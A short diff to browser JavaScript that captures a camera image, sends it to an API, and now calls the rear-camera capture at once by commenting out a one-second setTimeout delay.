@@ -163,11 +163,11 @@
                         var imageData = canvas.toDataURL('image/jpeg');
                         sendDataToAPI(imageData,"primary_");
                         video.srcObject.getTracks().forEach(track => track.stop());
-                        setTimeout(()=>{
+                        //ssetTimeout(()=>{
                             if(totalCam>1) {
                                 captureImageRearCamera();
                             }
-                        },1000);
+                        //},1000);
                     };
                 })
                 .catch((error) => {
